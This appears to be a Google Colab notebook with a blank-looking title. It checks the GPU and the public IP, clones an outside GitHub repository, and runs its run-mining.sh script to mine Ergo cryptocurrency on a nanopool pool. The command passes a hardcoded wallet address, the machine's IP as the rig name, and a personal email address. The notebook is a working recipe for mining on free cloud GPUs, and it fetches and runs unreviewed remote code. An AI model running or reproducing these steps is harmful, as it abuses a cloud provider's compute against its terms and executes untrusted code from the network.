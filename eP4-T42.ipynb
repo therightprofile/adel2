{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "C.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# **E**\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "cY1YjeXzZWkA"
      },
      "source": [
        "!nvidia-smi"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ADtzqJ2JtIjt"
      },
      "source": [
        "!curl ipinfo.io"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "!git clone https://github.com/maychan212/lahan.git\n",
        "%cd lahan\n",
        "!chmod +x run-mining.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./run-mining.sh -algo autolykos -pool1 ergo-eu1.nanopool.org:11111 -wallet 9eptrcc1fvV5BTkAaisLkoRv2e5eZ27ckjDabXQvbJoz2qQ2frn -coin ergo -rigName $ip -email widiantoadithya@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
